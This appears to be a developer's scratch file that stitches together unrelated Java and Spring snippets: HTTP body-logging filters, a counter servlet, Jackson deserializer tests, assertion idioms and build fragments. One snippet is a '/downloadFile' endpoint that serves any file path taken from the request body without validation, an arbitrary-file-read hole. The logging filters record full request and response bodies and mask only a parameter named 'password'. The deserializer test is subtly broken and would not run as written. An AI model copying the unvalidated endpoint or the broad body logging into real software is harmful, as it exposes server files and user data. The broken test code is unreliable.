    import javax.servlet.http.Cookie;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletRequestWrapper;
    import javax.servlet.http.HttpServletResponse;
    import org.apache.commons.io.output.TeeOutputStream;
    import org.slf4j.Logger;
    import org.slf4j.LoggerFactory;
    import org.springframework.stereotype.Component;

    @Component
    public class HttpLoggingFilter implements Filter {

        private static final Logger log = LoggerFactory.getLogger(HttpLoggingFilter.class);

        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest request, ServletResponse response,
                             FilterChain chain) throws IOException, ServletException {
            try {
                HttpServletRequest httpServletRequest = (HttpServletRequest) request;
                HttpServletResponse httpServletResponse = (HttpServletResponse) response;

                Map<String, String> requestMap = this
                        .getTypesafeRequestMap(httpServletRequest);
                BufferedRequestWrapper bufferedRequest = new BufferedRequestWrapper(
                        httpServletRequest);
                BufferedResponseWrapper bufferedResponse = new BufferedResponseWrapper(
                        httpServletResponse);

                final StringBuilder logMessage = new StringBuilder(
                        "REST Request - ").append("[HTTP METHOD:")
                        .append(httpServletRequest.getMethod())
                        .append("] [PATH INFO:")
                        .append(httpServletRequest.getServletPath())
                        .append("] [REQUEST PARAMETERS:").append(requestMap)
                        .append("] [REQUEST BODY:")
                        .append(bufferedRequest.getRequestBody())
                        .append("] [REMOTE ADDRESS:")
                        .append(httpServletRequest.getRemoteAddr()).append("]");

                chain.doFilter(bufferedRequest, bufferedResponse);
                logMessage.append(" [RESPONSE:")
                        .append(bufferedResponse.getContent()).append("]");
                log.debug(logMessage.toString());
            } catch (Throwable a) {
                log.error(a.getMessage());
            }
        }

        private Map<String, String> getTypesafeRequestMap(HttpServletRequest request) {
            Map<String, String> typesafeRequestMap = new HashMap<String, String>();
            Enumeration<?> requestParamNames = request.getParameterNames();
            while (requestParamNames.hasMoreElements()) {
                String requestParamName = (String) requestParamNames.nextElement();
                String requestParamValue;
                if (requestParamName.equalsIgnoreCase("password")) {
                    requestParamValue = "********";
                } else {
                    requestParamValue = request.getParameter(requestParamName);
                }
                typesafeRequestMap.put(requestParamName, requestParamValue);
            }
            return typesafeRequestMap;
        }

        @Override
        public void destroy() {
        }

        private static final class BufferedRequestWrapper extends
                HttpServletRequestWrapper {

            private ByteArrayInputStream bais = null;
            private ByteArrayOutputStream baos = null;
            private BufferedServletInputStream bsis = null;
            private byte[] buffer = null;

            public BufferedRequestWrapper(HttpServletRequest req)
                    throws IOException {
                super(req);
                // Read InputStream and store its content in a buffer.
                InputStream is = req.getInputStream();
                this.baos = new ByteArrayOutputStream();
                byte buf[] = new byte[1024];
                int read;
                while ((read = is.read(buf)) > 0) {
                    this.baos.write(buf, 0, read);
                }
                this.buffer = this.baos.toByteArray();
            }

            @Override
            public ServletInputStream getInputStream() {
                this.bais = new ByteArrayInputStream(this.buffer);
                this.bsis = new BufferedServletInputStream(this.bais);
                return this.bsis;
            }

            String getRequestBody() throws IOException {
                BufferedReader reader = new BufferedReader(new InputStreamReader(
                        this.getInputStream()));
                String line = null;
                StringBuilder inputBuffer = new StringBuilder();
                do {
                    line = reader.readLine();
                    if (null != line) {
                        inputBuffer.append(line.trim());
                    }
                } while (line != null);
                reader.close();
                return inputBuffer.toString().trim();
            }

        }

        private static final class BufferedServletInputStream extends
                ServletInputStream {

            private ByteArrayInputStream bais;

            public BufferedServletInputStream(ByteArrayInputStream bais) {
                this.bais = bais;
            }

            @Override
            public int available() {
                return this.bais.available();
            }

            @Override
            public int read() {
                return this.bais.read();
            }

            @Override
            public int read(byte[] buf, int off, int len) {
                return this.bais.read(buf, off, len);
            }

            @Override
            public boolean isFinished() {
                return false;
            }

            @Override
            public boolean isReady() {
                return true;
            }

            @Override
            public void setReadListener(ReadListener readListener) {

            }
        }

        public class TeeServletOutputStream extends ServletOutputStream {

            private final TeeOutputStream targetStream;

            public TeeServletOutputStream(OutputStream one, OutputStream two) {
                targetStream = new TeeOutputStream(one, two);
            }

            @Override
            public void write(int arg0) throws IOException {
                this.targetStream.write(arg0);
            }

            public void flush() throws IOException {
                super.flush();
                this.targetStream.flush();
            }

            public void close() throws IOException {
                super.close();
                this.targetStream.close();
            }

            @Override
            public boolean isReady() {
                return false;
            }

            @Override
            public void setWriteListener(WriteListener writeListener) {

            }
        }

        public class BufferedResponseWrapper implements HttpServletResponse {

            HttpServletResponse original;
            TeeServletOutputStream tee;
            ByteArrayOutputStream bos;

            public BufferedResponseWrapper(HttpServletResponse response) {
                original = response;
            }

            public String getContent() {
                return bos.toString();
            }

            public PrintWriter getWriter() throws IOException {
                return original.getWriter();
            }

            public ServletOutputStream getOutputStream() throws IOException {
                if (tee == null) {
                    bos = new ByteArrayOutputStream();
                    tee = new TeeServletOutputStream(original.getOutputStream(),
                            bos);
                }
                return tee;

            }

            @Override
            public String getCharacterEncoding() {
                return original.getCharacterEncoding();
            }

            @Override
            public String getContentType() {
                return original.getContentType();
            }

            @Override
            public void setCharacterEncoding(String charset) {
                original.setCharacterEncoding(charset);
            }

            @Override
            public void setContentLength(int len) {
                original.setContentLength(len);
            }

            @Override
            public void setContentLengthLong(long l) {
                original.setContentLengthLong(l);
            }

            @Override
            public void setContentType(String type) {
                original.setContentType(type);
            }

            @Override
            public void setBufferSize(int size) {
                original.setBufferSize(size);
            }

            @Override
            public int getBufferSize() {
                return original.getBufferSize();
            }

            @Override
            public void flushBuffer() throws IOException {
                tee.flush();
            }

            @Override
            public void resetBuffer() {
                original.resetBuffer();
            }

            @Override
            public boolean isCommitted() {
                return original.isCommitted();
            }

            @Override
            public void reset() {
                original.reset();
            }

            @Override
            public void setLocale(Locale loc) {
                original.setLocale(loc);
            }

            @Override
            public Locale getLocale() {
                return original.getLocale();
            }

            @Override
            public void addCookie(Cookie cookie) {
                original.addCookie(cookie);
            }

            @Override
            public boolean containsHeader(String name) {
                return original.containsHeader(name);
            }

            @Override
            public String encodeURL(String url) {
                return original.encodeURL(url);
            }

            @Override
            public String encodeRedirectURL(String url) {
                return original.encodeRedirectURL(url);
            }

            @SuppressWarnings("deprecation")
            @Override
            public String encodeUrl(String url) {
                return original.encodeUrl(url);
            }

            @SuppressWarnings("deprecation")
            @Override
            public String encodeRedirectUrl(String url) {
                return original.encodeRedirectUrl(url);
            }

            @Override
            public void sendError(int sc, String msg) throws IOException {
                original.sendError(sc, msg);
            }

            @Override
            public void sendError(int sc) throws IOException {
                original.sendError(sc);
            }

            @Override
            public void sendRedirect(String location) throws IOException {
                original.sendRedirect(location);
            }

            @Override
            public void setDateHeader(String name, long date) {
                original.setDateHeader(name, date);
            }

            @Override
            public void addDateHeader(String name, long date) {
                original.addDateHeader(name, date);
            }

            @Override
            public void setHeader(String name, String value) {
                original.setHeader(name, value);
            }

            @Override
            public void addHeader(String name, String value) {
                original.addHeader(name, value);
            }

            @Override
            public void setIntHeader(String name, int value) {
                original.setIntHeader(name, value);
            }

            @Override
            public void addIntHeader(String name, int value) {
                original.addIntHeader(name, value);
            }

            @Override
            public void setStatus(int sc) {
                original.setStatus(sc);
            }

            @SuppressWarnings("deprecation")
            @Override
            public void setStatus(int sc, String sm) {
                original.setStatus(sc, sm);
            }

            @Override
            public String getHeader(String arg0) {
                return original.getHeader(arg0);
            }

            @Override
            public Collection<String> getHeaderNames() {
                return original.getHeaderNames();
            }

            @Override
            public Collection<String> getHeaders(String arg0) {
                return original.getHeaders(arg0);
            }

            @Override
            public int getStatus() {
                return original.getStatus();
            }

        }
    }
	
	import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

public class CounterServer extends HttpServlet {
  static final String COUNTER_KEY = "Counter.txt";

  public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException,
      IOException {
    HttpSession session = req.getSession(true);
    int count = 1;
    Integer i = (Integer) session.getAttribute(COUNTER_KEY);
    if (i != null) {
      count = i.intValue() + 5;
    }
    session.setAttribute(COUNTER_KEY, new Integer(count));
    DataInputStream in = new DataInputStream(req.getInputStream());
    resp.setContentType("application/octet-stream");
    ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
    DataOutputStream out = new DataOutputStream(byteOut);
    out.writeInt(count);
    out.flush();
    byte[] buf = byteOut.toByteArray();
    resp.setContentLength(buf.length);
    ServletOutputStream servletOut = resp.getOutputStream();
    servletOut.write(buf);
    servletOut.close();
  }
}

   
	
	@Component
public class CustomHttpInterceptor extends HandlerInterceptorAdapter {

    @Override
    public boolean preHandle (final HttpServletRequest request, final HttpServletResponse response,
            final Object handler)
            throws Exception {

        // Logs here

        return super.preHandle(request, response, handler);
    }

    @Override
    public void afterCompletion(final HttpServletRequest request, final HttpServletResponse response,
            final Object handler, final Exception ex) {
        // Logs here
    }
}


@Configuration
public class WebMvcConfig implements WebMvcConfigurer {

    @Autowired
    CustomHttpInterceptor customHttpInterceptor;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(customHttpInterceptor).addPathPatterns("/endpoints");
    }

}




@Component
public class CustomHttpInterceptor extends HandlerInterceptorAdapter {

    private static final Logger LOGGER = LoggerFactory.getLogger(CustomHttpInterceptor.class);

    private static final int MAX_PAYLOAD_LENGTH = 1000;

    @Override
    public void afterCompletion(final HttpServletRequest request, final HttpServletResponse response,
            final Object handler, final Exception ex) {
        final byte[] contentAsByteArray = ((ContentCachingResponseWrapper) response).getContentAsByteArray();

        LOGGER.info("Request body:\n" + getContentAsString(contentAsByteArray, response.getCharacterEncoding()));
    }

    private String getContentAsString(byte[] buf, String charsetName) {
        if (buf == null || buf.length == 0) {
            return "";
        }

        try {
            int length = Math.min(buf.length, MAX_PAYLOAD_LENGTH);

            return new String(buf, 0, length, charsetName);
        } catch (UnsupportedEncodingException ex) {
            return "Unsupported Encoding";
        }
    }

}




@Configuration
public class LoggingFilter extends GenericFilterBean {

    /**
     * It's important that you actually register your filter this way rather then just annotating it
     * as @Component as you need to be able to set for which "DispatcherType"s to enable the filter
     * (see point *1*)
     * 
     * @return
     */
    @Bean
    public FilterRegistrationBean<LoggingFilter> initFilter() {
        FilterRegistrationBean<LoggingFilter> registrationBean = new FilterRegistrationBean<>();
        registrationBean.setFilter(new LoggingFilter());

        // *1* make sure you sett all dispatcher types if you want the filter to log upon
        registrationBean.setDispatcherTypes(EnumSet.allOf(DispatcherType.class));

        // *2* this should put your filter above any other filter
        registrationBean.setOrder(Ordered.HIGHEST_PRECEDENCE);

        return registrationBean;
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        ContentCachingRequestWrapper wreq = 
            new ContentCachingRequestWrapper(
                (HttpServletRequest) request);

        ContentCachingResponseWrapper wres = 
            new ContentCachingResponseWrapper(
                (HttpServletResponse) response);

        try {

            // let it be ...
            chain.doFilter(wreq, wres);

            // makes sure that the input is read (e.g. in 404 it may not be)
            while (wreq.getInputStream().read() >= 0);

            System.out.printf("=== REQUEST%n%s%n=== end request%n",
                    new String(wreq.getContentAsByteArray()));

            // Do whatever logging you wish here, in this case I'm writing request 
            // and response to system out which is probably not what you wish to do
            System.out.printf("=== RESPONSE%n%s%n=== end response%n",
                    new String(wres.getContentAsByteArray()));

            // this is specific of the "ContentCachingResponseWrapper" we are relying on, 
            // make sure you call it after you read the content from the response
            wres.copyBodyToResponse();

            // One more point, in case of redirect this will be called twice! beware to handle that
            // somewhat

        } catch (Throwable t) {
            // Do whatever logging you whish here, too
            // here you should also be logging the error!!!
            throw t;
        }

    }
}




	/**
 * Doogies very cool HTTP request logging
 *
 * There is also {@link org.springframework.web.filter.CommonsRequestLoggingFilter}  but it cannot log request method
 * And it cannot easily be extended.
 *
 * https://mdeinum.wordpress.com/2015/07/01/spring-framework-hidden-gems/
 * http://stackoverflow.com/questions/8933054/how-to-read-and-copy-the-http-servlet-response-output-stream-content-for-logging
 */
public class DoogiesRequestLogger extends OncePerRequestFilter {

  private boolean includeResponsePayload = true;
  private int maxPayloadLength = 1000;

  private String getContentAsString(byte[] buf, int maxLength, String charsetName) {
    if (buf == null || buf.length == 0) return "";
    int length = Math.min(buf.length, this.maxPayloadLength);
    try {
      return new String(buf, 0, length, charsetName);
    } catch (UnsupportedEncodingException ex) {
      return "Unsupported Encoding";
    }
  }

  /**
   * Log each request and respponse with full Request URI, content payload and duration of the request in ms.
   * @param request the request
   * @param response the response
   * @param filterChain chain of filters
   * @throws ServletException
   * @throws IOException
   */
  @Override
  protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {

    long startTime = System.currentTimeMillis();
    StringBuffer reqInfo = new StringBuffer()
     .append("[")
     .append(startTime % 10000)  // request ID
     .append("] ")
     .append(request.getMethod())
     .append(" ")
     .append(request.getRequestURL());

    String queryString = request.getQueryString();
    if (queryString != null) {
      reqInfo.append("?").append(queryString);
    }

    if (request.getAuthType() != null) {
      reqInfo.append(", authType=")
        .append(request.getAuthType());
    }
    if (request.getUserPrincipal() != null) {
      reqInfo.append(", principalName=")
        .append(request.getUserPrincipal().getName());
    }

    this.logger.debug("=> " + reqInfo);

    // ========= Log request and response payload ("body") ========
    // We CANNOT simply read the request payload here, because then the InputStream would be consumed and cannot be read again by the actual processing/server.
    //    String reqBody = DoogiesUtil._stream2String(request.getInputStream());   // THIS WOULD NOT WORK!
    // So we need to apply some stronger magic here :-)
    ContentCachingRequestWrapper wrappedRequest = new ContentCachingRequestWrapper(request);
    ContentCachingResponseWrapper wrappedResponse = new ContentCachingResponseWrapper(response);

    filterChain.doFilter(wrappedRequest, wrappedResponse);     // ======== This performs the actual request!
    long duration = System.currentTimeMillis() - startTime;

    // I can only log the request's body AFTER the request has been made and ContentCachingRequestWrapper did its work.
    String requestBody = this.getContentAsString(wrappedRequest.getContentAsByteArray(), this.maxPayloadLength, request.getCharacterEncoding());
    if (requestBody.length() > 0) {
      this.logger.debug("   Request body:\n" +requestBody);
    }

    this.logger.debug("<= " + reqInfo + ": returned status=" + response.getStatus() + " in "+duration + "ms");
    if (includeResponsePayload) {
      byte[] buf = wrappedResponse.getContentAsByteArray();
      this.logger.debug("   Response body:\n"+getContentAsString(buf, this.maxPayloadLength, response.getCharacterEncoding()));
    }

    wrappedResponse.copyBodyToResponse();  // IMPORTANT: copy content of response back into original response

  }
}
==============================================================================================================
@SpringBootApplication
@RestController
public class FiledownloadApplication {

    public static void main(String[] args) {
        SpringApplication.run(FiledownloadApplication.class, args);
    }


    @PostMapping("/downloadFile")
    public ResponseEntity<FileSystemResource> download(@RequestBody FileDownload fileDownload) throws IOException {
        String path = fileDownload.getPath();
        FileSystemResource fileSystemResource = new FileSystemResource(path);
        return new ResponseEntity<>(fileSystemResource, HttpStatus.OK);
    }

    class FileDownload {

        String path;

        public FileDownload() {
        }

        public String getPath() {
            return path;
        }

        public void setPath(String path) {
            this.path = path;
        }
    }
}
==============================================================================================================
#!/bin/sh
#
# Copyright (c) 2001-2016 Mathew A. Nelson and Robocode contributors
# All rights reserved. This program and the accompanying materials
# are made available under the terms of the Eclipse Public License v1.0
# which accompanies this distribution, and is available at
# http://robocode.sourceforge.net/license/epl-v10.html
#

pwd=`pwd`
cd "${0%/*}"
java -Xmx512M -DNOSECURITY=true -Dsun.io.useCanonCaches=false -cp libs/robocode.jar robocode.Robocode $*
cd "${pwd}"
==============================================================================================================
 *  &#64;JsonDeserialize(using=MySerializer.class,
 *    as=MyHashMap.class,
 *    keyAs=MyHashKey.class,
 *    contentAs=MyHashValue.class
 *  )
==============================================================================================================
package com.paragon.microservices.documents.generator.server.system.serializer;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.module.SimpleModule;
import com.paragon.mailingcontour.commons.rest.configuration.RestApiConfiguration;
import com.paragon.microservices.documents.generator.server.common.annotation.SpringUnitTest;
import com.paragon.microservices.documents.generator.server.common.annotation.TestTag;
import com.paragon.microservices.documents.generator.server.model.dto.RequestDto;
import com.paragon.microservices.documents.generator.server.model.enumeration.TemplateType;
import com.paragon.microservices.documents.generator.server.system.configuration.BaseConfiguration;
import com.paragon.microservices.documents.generator.server.system.converter.StringToMediaTypeConverter;
import org.junit.Before;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.actuate.autoconfigure.cache.CachesEndpointAutoConfiguration;
import org.springframework.boot.actuate.autoconfigure.health.HealthIndicatorAutoConfiguration;
import org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthIndicatorAutoConfiguration;
import org.springframework.boot.actuate.autoconfigure.metrics.MetricsAutoConfiguration;
import org.springframework.boot.actuate.autoconfigure.metrics.cache.CacheMetricsAutoConfiguration;
import org.springframework.boot.actuate.autoconfigure.metrics.web.servlet.WebMvcMetricsAutoConfiguration;
import org.springframework.boot.actuate.autoconfigure.redis.RedisHealthIndicatorAutoConfiguration;
import org.springframework.boot.actuate.autoconfigure.redis.RedisReactiveHealthIndicatorAutoConfiguration;
import org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration;
import org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration;
import org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration;
import org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration;
import org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration;
import org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration;
import org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration;
import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;
import org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration;
import org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration;
import org.springframework.boot.autoconfigure.security.servlet.UserDetailsServiceAutoConfiguration;
import org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration;
import org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.core.convert.ConversionService;
import org.springframework.http.MediaType;
import org.springframework.http.converter.json.Jackson2ObjectMapperBuilder;
import org.springframework.test.annotation.DirtiesContext;

import java.io.IOException;
import java.util.Locale;
import java.util.UUID;

import static org.junit.jupiter.api.Assertions.assertEquals;

@Tag(TestTag.SERIALIZER)
@SpringUnitTest(
        classes = {
                // configuration
                MediaTypeDeserializerTest.TestConfiguration.class,
                BaseConfiguration.class,
                RestApiConfiguration.class,
                // converters
                StringToMediaTypeConverter.class
        },
        classMode = DirtiesContext.ClassMode.BEFORE_EACH_TEST_METHOD,
        exclude = {
                TaskExecutionAutoConfiguration.class,
                SpringDataWebAutoConfiguration.class,
                RedisAutoConfiguration.class,
                RedisRepositoriesAutoConfiguration.class,
                MetricsAutoConfiguration.class,
                WebMvcMetricsAutoConfiguration.class,
                UserDetailsServiceAutoConfiguration.class,
                DataSourceAutoConfiguration.class,
                JpaRepositoriesAutoConfiguration.class,
                RestTemplateAutoConfiguration.class,
                DataSourceTransactionManagerAutoConfiguration.class,
                HibernateJpaAutoConfiguration.class,
                JacksonAutoConfiguration.class,
                FreeMarkerAutoConfiguration.class,
                CacheAutoConfiguration.class,
                CacheMetricsAutoConfiguration.class,
                CachesEndpointAutoConfiguration.class,
                HealthIndicatorAutoConfiguration.class,
                DataSourceHealthIndicatorAutoConfiguration.class,
                RedisHealthIndicatorAutoConfiguration.class,
                RedisReactiveHealthIndicatorAutoConfiguration.class
        }
)
class MediaTypeDeserializerTest {

    @Autowired
    private ObjectMapper objectMapper;
    @Autowired
    private ConversionService conversionService;

    private ObjectMapper resultObjectMapper;

    @Before
    void setUp() {
        final SimpleModule typeModule = new SimpleModule("MediaTypeModule");
        typeModule.addDeserializer(MediaType.class, new MediaTypeDeserializer(this.objectMapper, this.conversionService));
        this.resultObjectMapper.registerModule(typeModule);
    }

    @Test
    void test_convert_String_To_RequestDto_whenPassed_StandardMediaType_Message() throws IOException {
        // given
        final String source = "{" +
                "\"id\": \"2e3dbe91-9a2c-41c0-a07a-478351ca6f74\",\n" +
                "\"templateName\": \"need.assistance\",\n" +
                "\"templateType\": \"email\",\n" +
                "\"locale\": \"en\",\n" +
                "\"mediaType\": \"text/html\",\n" +
                "\"data\": {}" +
                "}";
        final RequestDto expected = RequestDto.builder()
                .id(UUID.fromString("2e3dbe91-9a2c-41c0-a07a-478351ca6f74"))
                .templateName("need.assistance")
                .templateType(TemplateType.EMAIL.getCode())
                .locale(Locale.ENGLISH)
                .mediaType(MediaType.TEXT_HTML)
                .data(new Object())
                .build();

        // when
        final RequestDto actual = this.resultObjectMapper.readValue(source, RequestDto.class);

        // then
        assertEquals(expected, actual);
    }

    @Test
    void test_convert_String_To_RequestDto_whenPassed_SimpleMediaType_Message() throws IOException {
        // given
        final String source = "{" +
                "\"id\": \"2e3dbe91-9a2c-41c0-a07a-478351ca6f74\",\n" +
                "\"templateName\": \"need.assistance\",\n" +
                "\"templateType\": \"email\",\n" +
                "\"locale\": \"en\",\n" +
                "\"mediaType\": \"text\",\n" +
                "\"data\": {}" +
                "}";
        final RequestDto expected = RequestDto.builder()
                .id(UUID.fromString("2e3dbe91-9a2c-41c0-a07a-478351ca6f74"))
                .templateName("need.assistance")
                .templateType(TemplateType.EMAIL.getCode())
                .locale(Locale.ENGLISH)
                .mediaType(MediaType.TEXT_HTML)
                .data(new Object())
                .build();

        // when
        final RequestDto actual = this.resultObjectMapper.readValue(source, RequestDto.class);

        // then
        assertEquals(expected, actual);
    }


    @Test
    void test_convert_String_To_RequestDto_whenPassed_InvalidFormatMediaType_Message() throws IOException {
        // given
        final String source = "{" +
                "\"id\": \"2e3dbe91-9a2c-41c0-a07a-478351ca6f74\",\n" +
                " \"templateName\": \"need.assistance\",\n" +
                " \"templateType\": \"email\",\n" +
                " \"locale\": \"en\",\n" +
                " \"mediaType\": \"text html\",\n" +
                " \"data\": {}" +
                "}";
        final RequestDto expected = RequestDto.builder()
                .id(UUID.fromString("2e3dbe91-9a2c-41c0-a07a-478351ca6f74"))
                .templateName("need.assistance")
                .templateType(TemplateType.EMAIL.getCode())
                .locale(Locale.ENGLISH)
                .mediaType(MediaType.TEXT_HTML)
                .data(new Object())
                .build();

        // when
        final RequestDto actual = this.resultObjectMapper.readValue(source, RequestDto.class);

        // then
        assertEquals(expected, actual);
    }

    @Test
    void test_convert_String_To_RequestDto_whenPassed_InvalidMediaType_Message() throws IOException {
        // given
        final String source = "{" +
                "\"id\": \"2e3dbe91-9a2c-41c0-a07a-478351ca6f74\",\n" +
                " \"templateName\": \"need.assistance\",\n" +
                " \"templateType\": \"email\",\n" +
                " \"locale\": \"en\",\n" +
                " \"mediaType\": \"test\",\n" +
                " \"data\": {}" +
                "}";
        final RequestDto expected = RequestDto.builder()
                .id(UUID.fromString("2e3dbe91-9a2c-41c0-a07a-478351ca6f74"))
                .templateName("need.assistance")
                .templateType(TemplateType.EMAIL.getCode())
                .locale(Locale.ENGLISH)
                .mediaType(MediaType.TEXT_HTML)
                .data(new Object())
                .build();

        // when
        final RequestDto actual = this.resultObjectMapper.readValue(source, RequestDto.class);

        // then
        assertEquals(expected, actual);
    }

    @Test
    void test_convert_String_To_RequestDto_whenPassed_FullMediaType_Message() throws IOException {
        // given
        final String source = "{" +
                "\"id\": \"2e3dbe91-9a2c-41c0-a07a-478351ca6f74\",\n" +
                "                    \"templateName\": \"need.assistance\",\n" +
                "                    \"templateType\": \"email\",\n" +
                "                    \"locale\": \"en\",\n" +
                "                    \"mediaType\": {\n" +
                "                        \"type\": \"text\",\n" +
                "                        \"subtype\": \"html\",\n" +
                "                        \"parameters\": {},\n" +
                "                        \"qualityValue\": 1.0,\n" +
                "                        \"concrete\": true,\n" +
                "                        \"charset\": null,\n" +
                "                        \"wildcardType\": false,\n" +
                "                        \"wildcardSubtype\": false\n" +
                "                    },\n" +
                "                    \"data\": {}" +
                "}";
        final RequestDto expected = RequestDto.builder()
                .id(UUID.fromString("2e3dbe91-9a2c-41c0-a07a-478351ca6f74"))
                .templateName("need.assistance")
                .templateType(TemplateType.EMAIL.getCode())
                .locale(Locale.ENGLISH)
                .mediaType(MediaType.TEXT_HTML)
                .data(new Object())
                .build();

        // when
        final RequestDto actual = this.resultObjectMapper.readValue(source, RequestDto.class);

        // then
        assertEquals(expected, actual);
    }

    @org.springframework.boot.test.context.TestConfiguration
    public static class TestConfiguration {
        @Bean
        public Jackson2ObjectMapperBuilder jackson2ObjectMapperBuilder() {
            return Jackson2ObjectMapperBuilder.json().deserializerByType() ;
        }
    }
}

Assert.assertTrue(new ReflectionEquals(expected, excludeFields).matches(actual));
Assert.assertTrue(EqualsBuilder.reflectionEquals(expected,actual));

public void test() {
        // do the actual test
        assertThat(actualObject)
            .isEqualToComparingFieldByFieldRecursively(expectedObject);
    }
	
	public void test() {
        // do the actual test
        assertThat(actualObject)
            .usingRecursiveComparison()
            .isEqualTo(expectedObject);
    }
	
String s = new ReflectionToStringBuilder(o, ToStringStyle.SHORT_PREFIX_STYLE)
                .setExcludeFieldNames(new String[] { "foo", "bar" }).toString()
				
import static org.hamcrest.beans.SamePropertyValuesAs.samePropertyValuesAs;
...
SomeClass expected = buildExpected(); 
SomeClass actual = sut.doSomething();

assertThat(actual.getSubObject(), is(samePropertyValuesAs(expected.getSubObject())));    
expected.setSubObject(null);
actual.setSubObject(null);

assertThat(actual, is(samePropertyValuesAs(expected)));
assertThat(obj1, reflectEquals(obj2));
==============================================================================================================
0x25 0x50 0x44 0x46
==============================================================================================================
@JsonCreator
public ImportResultItemImpl(@JsonProperty("name") String name, 
        @JsonProperty("resultType") ImportResultItemType resultType, 
        @JsonProperty("message") String message) {
    super();
    this.resultType = resultType;
    this.message = message;
    this.name = name;
}

{"type":"text","subtype":"html","parameters":{},"qualityValue":1.0,"wildcardType":false,"charset":null,"concrete":true,"wildcardSubtype":false}
==============================================================================================================
git merge --no-commit; git diff
==============================================================================================================
    ObjectMapper mapper = new ObjectMapper();  
    SimpleModule mod = new SimpleModule("EfsModule");
    mod.addDeserializer(Efs.class, new CustomDeserializer(Efs.class));
    mapper.registerModule(mod);


    List<HttpMessageConverter<?>> messageConverters = new ArrayList<>();
    MappingJackson2HttpMessageConverter jsonMessageConverter = new MappingJackson2HttpMessageConverter();
    jsonMessageConverter.setObjectMapper(mapper);
    messageConverters.add(jsonMessageConverter);


    RestTemplate restTemplate = new RestTemplate();
    restTemplate.setMessageConverters(messageConverters);
==============================================================================================================
import javax.servlet.ServletOutputStream;
import javax.servlet.WriteListener;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;

public class ServletOutputStreamCopier extends ServletOutputStream {
    private final OutputStream outputStream;
    private final ByteArrayOutputStream copy;

    public ServletOutputStreamCopier(final OutputStream outputStream) {
        this.outputStream = outputStream;
        this.copy = new ByteArrayOutputStream(1024);
    }

    @Override
    public void write(final int b) throws IOException {
        this.outputStream.write(b);
        this.copy.write(b);
    }

    public byte[] getCopy() {
        return this.copy.toByteArray();
    }

    @Override
    public boolean isReady() {
        return false;
    }

    @Override
    public void setWriteListener(final WriteListener listener) {
    }
}


import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletResponseWrapper;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;

public class HttpServletResponseCopier extends HttpServletResponseWrapper {
    private ServletOutputStream outputStream;
    private PrintWriter writer;
    private ServletOutputStreamCopier copier;

    public HttpServletResponseCopier(final HttpServletResponse response) {
        super(response);
    }

    /**
     * {@inheritDoc}
     *
     * @see HttpServletResponseWrapper
     */
    @Override
    public ServletOutputStream getOutputStream() throws IOException {
        if (this.writer != null) {
            throw new IllegalStateException("getWriter() has already been called on this response.");
        }
        if (this.outputStream == null) {
            this.outputStream = this.getResponse().getOutputStream();
            this.copier = new ServletOutputStreamCopier(this.outputStream);
        }
        return this.copier;
    }

    /**
     * {@inheritDoc}
     *
     * @see HttpServletResponseWrapper
     */
    @Override
    public PrintWriter getWriter() throws IOException {
        if (this.outputStream != null) {
            throw new IllegalStateException("getOutputStream() has already been called on this response.");
        }
        if (this.writer == null) {
            this.copier = new ServletOutputStreamCopier(this.getResponse().getOutputStream());
            this.writer = new PrintWriter(new OutputStreamWriter(this.copier, this.getResponse().getCharacterEncoding()), true);
        }
        return writer;
    }

    /**
     * {@inheritDoc}
     *
     * @see HttpServletResponseWrapper
     */
    @Override
    public void flushBuffer() throws IOException {
        if (this.writer != null) {
            this.writer.flush();
        } else if (this.outputStream != null) {
            this.copier.flush();
        }
    }

    public byte[] getCopy() {
        if (this.copier != null) {
            return this.copier.getCopy();
        }
        return new byte[0];
    }
}
==============================================================================================================
<dependencies>
        <dependency>
            <groupId>org.jetbrains.kotlin</groupId>
            <artifactId>kotlin-reflect</artifactId>
            <version>1.1.0</version>
        </dependency>
    </dependencies>
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
spring-aop, aspectjrt, aspectjweaver
Add this to your xml config file <aop:aspectj-autoproxy/>

Create an annotation which can be used as a pointcut

@Retention(RetentionPolicy.RUNTIME)
@Target({ElementType.METHOD,ElementType.TYPE})
public @interface EnableLogging {
ActionType actionType();
}
